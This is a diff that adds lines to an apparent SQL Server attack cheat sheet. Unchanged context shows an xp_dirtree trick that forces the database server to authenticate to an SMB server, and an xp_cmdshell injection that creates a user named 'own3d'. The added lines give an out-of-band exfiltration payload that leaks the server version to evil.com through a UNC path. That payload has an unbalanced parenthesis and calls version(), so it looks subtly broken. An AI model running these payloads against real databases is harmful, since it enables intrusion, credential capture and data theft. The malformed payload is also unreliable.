@@ -152,6 +152,9 @@ select name, definition, type_desc FROM sys.sql_modules m INNER JOIN sys.objects
 master.dbo.xp_dirtree to force the db server to authenticate to an SMB server
 EXEC master.sys.xp_dirtree 'D:\Backup\TRON4\TEST2\MyDb1',0,1;
 
+# oob
+select * from fn_trace_gettable('\\'+(select version())+'.evil.com'))
+
 # xp_cmdshell
 id=1; exec xp_cmdshell 'net user own3d Password1 /add'
 
